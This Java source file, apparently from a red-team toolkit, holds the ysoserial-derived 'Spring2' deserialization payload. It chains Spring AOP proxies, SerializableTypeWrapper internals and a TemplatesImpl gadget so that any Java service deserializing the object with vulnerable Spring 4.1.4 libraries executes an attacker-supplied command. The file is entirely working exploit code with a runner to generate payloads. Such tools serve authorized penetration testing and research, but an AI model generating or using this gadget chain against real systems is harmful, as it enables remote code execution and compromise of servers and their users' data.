package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({
        "org.springframework:spring-core:4.1.4.RELEASE",
        "org.springframework:spring-aop:4.1.4.RELEASE",
        "aopalliance:aopalliance:1.0",
        "commons-logging:commons-logging:1.2"
})
@Authors({Authors.MBECHLER})
public class Spring2 implements ObjectPayload<Object> {

    @Override
    public Object getObject(final String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTargetSource(new SingletonTargetSource(templates));

        Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
                        Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy")
                                .newInstance(advisedSupport),
                Type.class,
                Templates.class);

        Object typeProviderProxy = Gadgets.createMemoitizedProxy(
                Gadgets.createMap("getType", typeTemplatesProxy),
                forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        Object mitp = Reflections.createWithoutConstructor(
                forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"));
        Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");
        return mitp;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Spring2.class, args);
    }
}
